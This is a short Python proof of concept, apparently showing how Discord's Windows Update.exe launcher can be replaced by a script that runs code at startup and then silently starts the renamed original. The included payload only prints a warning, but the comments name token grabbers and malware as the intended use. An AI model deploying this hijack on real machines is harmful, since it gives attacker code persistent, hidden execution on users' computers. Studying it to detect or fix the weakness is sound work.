# This is where the attacker would put any malicious code to be ran on Discord startup.
# Ex: malware, token grabber, etc.

import sys
from ntpath import *
from os import name
from subprocess import run


def run_discord(script: str) -> None:
    # %localappdata%\Discord\Update.exe --processStart discord.exe
    path = join(dirname(script), "Update.bak.exe")
    if not exists(path):
        raise SystemExit("Failed to find 'Update.bak.exe'.")
    client = basename(dirname(script)).lower()

    _CMD = [path, "--processStart", f"{client}.exe"]
    print(f"Executing {' '.join(_CMD)}")
    run(_CMD)


def get_script_path() -> str:
    # executable (Update.exe)
    if getattr(sys, "frozen", False):
        path = realpath(sys.executable)
    # python script
    elif __file__:
        path = abspath(__file__)
    else:
        path = sys.argv[0]
    return path


def main() -> None:
    print("Your Discord installation has been compromised!")
    script = get_script_path()
    run_discord(script)
    input()


if __name__ == "__main__" and name == "nt":
    main()
